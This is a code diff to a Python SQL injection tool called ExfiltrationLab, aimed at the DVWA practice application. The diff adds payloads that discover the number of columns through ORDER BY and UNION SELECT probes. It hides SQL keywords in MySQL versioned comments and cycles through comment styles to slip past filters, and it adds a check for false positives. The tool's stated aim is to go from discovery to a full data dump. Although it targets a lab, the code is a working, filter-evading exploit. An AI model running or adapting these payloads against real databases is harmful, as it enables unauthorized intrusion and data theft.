@@ -9,7 +9,15 @@ class ExfiltrationLab:
     A completely independent "Second Lab" specialized strictly in Data Extraction.
     It operates as a sequential exploitation machine, moving from discovery to full dump.
     """
-    def __init__(self, base_url, username, password, security_level="medium"):
+    def __init__(self, target_url, username, password, security_level="medium"):
+        # Intelligently derive base_url from target_url
+        base_url = target_url
+        if "vulnerabilities" in target_url:
+            base_url = target_url.split("vulnerabilities")[0]
+        elif target_url.endswith(".php"):
+            # Strip the filename to get the directory root
+            base_url = "/".join(target_url.split("/")[:-1])
+            
         self.client = HTTPClient(base_url)
         self.client.setup_dvwa(username, password, security_level)
         self.validator = SuccessValidator()
@@ -52,25 +60,31 @@ class ExfiltrationLab:
 
     def _discover_columns(self):
         print("[*] Stage 1: Column Count Discovery...")
-        # Strategy: ORDER BY with numeric prefix
+        # Strategy: ORDER BY with obfuscation and various comments
         for i in range(1, 15):
-            payload = f"1 ORDER BY {i}#"
-            res = self.client.send_request(payload)
-            err = self.validator.get_sql_error(res['text'])
-            if err and ("Unknown column" in err or "order clause" in err):
-                self.column_count = i - 1
-                print(f"[+] Found Column Count: {self.column_count}")
-                return True
+            for comment in ["#", "-- -", "/*"]:
+                # Using Versioned Comments for subtle bypass
+                payload = f"1 /*!ORDER*/ /*!BY*/ {i}{comment}"
+                res = self.client.send_request(payload)
+                err = self.validator.get_sql_error(res['text'])
+                if err and ("Unknown column" in err or "order clause" in err or "group clause" in err):
+                    self.column_count = i - 1
+                    print(f"[+] Found Column Count: {self.column_count}")
+                    return True
         
-        # Fallback: UNION Probing with numeric prefix
+        # Fallback: UNION Probing with Versioned Comments
         for i in range(1, 10):
             nulls = ",".join(["NULL"] * i)
-            payload = f"1 UNION SELECT {nulls}#"
+            payload = f"1 /*!UNION*/ /*!SELECT*/ {nulls}#"
             res = self.client.send_request(payload)
             if res['status'] == 200 and not self.validator.get_sql_error(res['text']):
-                self.column_count = i
-                print(f"[+] Found Column Count (via UNION): {self.column_count}")
-                return True
+                # Double check success by provoking an error with one more NULL
+                check_payload = f"1 /*!UNION*/ /*!SELECT*/ {nulls},NULL#"
+                check_res = self.client.send_request(check_payload)
+                if self.validator.get_sql_error(check_res['text']):
+                    self.column_count = i
+                    print(f"[+] Found Column Count (via UNION): {self.column_count}")
+                    return True
                 
         return False
 
